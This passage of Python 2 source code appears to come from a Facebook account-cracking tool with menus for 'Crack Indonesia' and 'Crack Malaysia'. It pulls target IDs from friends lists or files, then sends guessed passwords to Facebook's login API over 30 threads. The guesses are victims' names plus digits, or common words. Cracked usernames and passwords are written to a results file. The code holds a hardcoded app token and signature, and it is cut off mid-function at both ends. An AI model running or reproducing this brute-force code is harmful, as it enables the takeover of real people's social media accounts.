    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mDone ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo9
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack From Friends list'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack From Public Friends List'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack From File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_indo()


def pilih_indo():
    teak = raw_input('\x1b[1;91mWhich Choice Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m The Choice One Wrong...!'
        pilih_indo()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo15
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo15
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / Friend Doesnt exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo15
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDONESIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mName File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File doesnt exist ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File doesnt exist !'
                    raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                    crack_indo()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m The.Choice One Wrong...!'
                pilih_pakis()
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Token CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCracker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode 5 Seconds'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Sayang786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mDone ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mBack\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_malay():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo10
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack From Friends list'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack From Public Friends List'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack From File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_malay()


def pilih_malay():
    teak = raw_input('\x1b[1;91mWhich one choice Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m The Choice One Wrong...!'
        pilih_malay()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo17
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo17
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mName \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / Friend doesnt exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo17
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK MALAYSIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mName File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File doesnt exist ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File doesnt exist !'
                    raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                    crack_malay()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m wrong...!'
                pilih_malay()
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Token CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCracker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode for 5 Seconds'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
